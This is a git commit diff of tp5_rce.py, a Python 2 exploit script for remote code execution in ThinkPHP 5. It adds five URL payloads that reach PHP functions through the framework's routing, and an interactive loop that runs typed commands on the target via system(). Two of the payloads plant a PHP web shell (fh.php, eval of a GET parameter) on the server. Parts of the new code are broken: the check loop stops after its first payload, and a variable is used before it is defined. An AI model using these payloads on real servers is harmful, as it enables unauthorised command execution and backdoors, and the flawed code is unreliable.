1565fd20bdfa43f5b707ffa12664edc2cb99fd63
fuhei <839423419@qq.com>
2018-12-12 00:10:53 +0800

    update payload but code is a bit messy

--- tp5_rce.py
+++ tp5_rce.py
@@ -8,38 +8,60 @@ reload(sys)
 sys.setdefaultencoding('utf-8')
 
 def test(url):
-    payload = r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
-    url += payload
-    #print url
-    try:
-        r = requests.get(url)
-        if 'PHP Version' in r.text:
-            return True
-        else:
-            return False
-    except:
-        print '[!] Destination address cannot be connected'
-        return False
+    payload = ['',r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
+    r"/?s=index/\think\Request/input&filter=phpinfo&data=1",
+    r"/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
+    r"/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E",
+    r"/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E"]
 
-def exp(u):
+    for i in range(1,6):    
+        url += payload[i]
+        #print url
+        try:
+            r = requests.get(url,verify=False)
+            if 'PHP Version' in r.text:
+                return i
+            else:
+                return False
+        except:
+            print '[!] Destination address cannot be connected'
+            return False
+
+def exp(u,i):
+    payload = ['',r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=",
+    r"/?s=index/\think\Request/input&filter=system&data=",
+    r"/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=",
+    r"/?s=index/\think\template\driver\file/write&cacheFile=fh.php&content=%3C?php @eval($_GET['fuhei']);?%3E",
+    r"/?s=index/\think\view\driver\Php/display&content=%3C?php @eval($_GET['fuhei']);?%3E"]
     while(1):
         url = u
         command = raw_input("fuhei@tp5_shell$ ")
-        if command != "exit":
-            payload = r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]="+str(command)
-            url += payload
+        if command != "exit" and i < 4:
+            payload1 = payload[i]+str(command)
+            url += payload1
+            r = requests.get(url)
+            print r.text
+        elif command != "exit" and i == 4:
+            uu = u+payload[4]
+            requests.get(uu)
+            payload2 = "/fh.php?fuhei=system('"+str(command)+"');"
+            url += payload2
+            #print url
+            r = requests.get(url)
+            print r.text
+        elif command != "exit" and i == 5:
+            payload3 += payload[5]+"&fuhei=system('"+str(command)+"');"
+            url += payload3
             r = requests.get(url)
             print r.text
         else:
             break
 
-
-
-
 if __name__ == '__main__':
     url = sys.argv[1]
-    if test(url):
+    i = test(url)
+    if i:
         print "[+] Remote code execution vulnerability exists at the target address"
-        exp(url)
+        exp(url,i)
     else:
         print "[-] There is no remote code execution vulnerability in the target address"
